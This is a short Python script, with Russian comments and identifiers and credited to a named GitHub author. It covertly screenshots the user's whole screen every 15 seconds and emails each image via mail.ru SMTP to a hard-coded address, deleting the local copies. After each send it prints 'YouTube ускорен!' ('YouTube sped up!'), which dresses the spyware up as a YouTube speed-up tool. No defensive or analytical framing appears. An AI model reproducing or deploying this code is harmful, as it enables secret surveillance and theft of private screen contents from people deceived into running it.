# Автор проекта: Емельянов Григорий Андреевич @emelyagr https://github.com/emelyagr
# Author of the project: Emelyanov Grigory Andreevich @emelyagr https://github.com/emelyagr -->

import os
import smtplib
import time
from email.message import EmailMessage
import pyautogui
from dotenv import load_dotenv

# Загружаем данные из .env файла
load_dotenv()

# Получаем логин и пароль из .env файла
EMAIL_USER = os.getenv('EMAIL_USER')
EMAIL_PASS = os.getenv('EMAIL_PASS')

# Функция для создания скриншота
def сделать_скриншот():
    снимок_экрана = pyautogui.screenshot()
    имя_файла = f'скриншот_{int(time.time())}.png'
    снимок_экрана.save(имя_файла)
    return имя_файла

# Функция для отправки письма с вложением
def отправить_письмо(путь_к_файлу, адрес_получателя):
    сообщение = EmailMessage()
    сообщение['Subject'] = 'Скриншот экрана'
    сообщение['From'] = EMAIL_USER
    сообщение['To'] = адрес_получателя

    with open(путь_к_файлу, 'rb') as файл:
        данные_файла = файл.read()
        имя_файла = os.path.basename(путь_к_файлу)
        сообщение.add_attachment(данные_файла, maintype='image', subtype='png', filename=имя_файла)

    try:
        with smtplib.SMTP_SSL('smtp.mail.ru', 465) as smtp:
            smtp.login(EMAIL_USER, EMAIL_PASS)
            smtp.send_message(сообщение)
            print("YouTube ускорен!")
    except smtplib.SMTPAuthenticationError as e:
        print("Ошибка 1: , напишите автору проекта", e)
    except Exception as e:
        print("Произошла ошибка 2: , напишите автору проекта", e)

# Автор проекта: Емельянов Григорий Андреевич @emelyagr https://github.com/emelyagr
# Author of the project: Emelyanov Grigory Andreevich @emelyagr https://github.com/emelyagr -->

# Основная функция
def главная_функция():
    адрес_получателя = "youremail@mail.ru"
    while True:
        имя_файла_скриншота = сделать_скриншот()
        отправить_письмо(имя_файла_скриншота, адрес_получателя)
        os.remove(имя_файла_скриншота) # Удаляем файл скриншота после отправки
        time.sleep(15) # Ждем 15 секунд перед следующим скриншотом

# Выполняем код только если скрипт запущен напрямую
if __name__ == "__main__":
    главная_функция()
